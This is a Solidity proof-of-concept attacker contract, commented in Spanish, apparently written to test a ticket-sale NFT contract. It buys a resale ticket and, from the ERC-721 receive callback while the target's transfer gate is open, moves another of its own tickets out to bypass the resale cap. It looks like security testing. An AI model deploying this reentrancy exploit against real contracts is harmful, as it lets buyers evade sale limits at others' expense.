// SPDX-License-Identifier: MIT
pragma solidity 0.8.34;

import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IEntradasC {
    function comprar() external payable returns (uint256);
    function comprarReventa(uint256 tokenId) external payable;
}

/**
 * @title AtacanteCompuerta · prueba de concepto
 * @notice Comprueba si la compuerta `_transferenciaAbierta` se puede aprovechar
 *         desde el callback de recepción del ERC-721.
 *
 *         La idea: `comprarReventa` abre la compuerta, llama a `_safeTransfer`
 *         y esa llamada avisa al receptor con `onERC721Received`. Si el
 *         receptor es un contrato, su código corre CON LA COMPUERTA ABIERTA.
 */
contract AtacanteCompuerta is IERC721Receiver {
    IEntradasC public immutable entradas;
    address public destino;
    uint256 public tokenAEscapar;
    bool public loLogro;

    constructor(address entradas_) {
        entradas = IEntradasC(entradas_);
    }

    receive() external payable {}

    function comprarOriginal() external payable returns (uint256) {
        return entradas.comprar{value: msg.value}();
    }

    /// Prepara el escape: qué entrada propia se quiere sacar y hacia dónde.
    function prepararEscape(uint256 tokenId, address haciaDonde) external {
        tokenAEscapar = tokenId;
        destino = haciaDonde;
    }

    /// Dispara la compra legítima de otra entrada; el escape ocurre en el callback.
    function comprarYEscapar(uint256 tokenEnVenta) external payable {
        entradas.comprarReventa{value: msg.value}(tokenEnVenta);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if (destino != address(0)) {
            address haciaDonde = destino;
            destino = address(0); // una sola vez, para no entrar en bucle
            // La compuerta del contrato de entradas sigue abierta en este
            // instante: intentamos mover UNA ENTRADA PROPIA sin pasar por
            // comprarReventa y, por tanto, sin respetar el tope.
            try IERC721(address(entradas)).transferFrom(address(this), haciaDonde, tokenAEscapar) {
                loLogro = true;
            } catch {
                loLogro = false;
            }
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
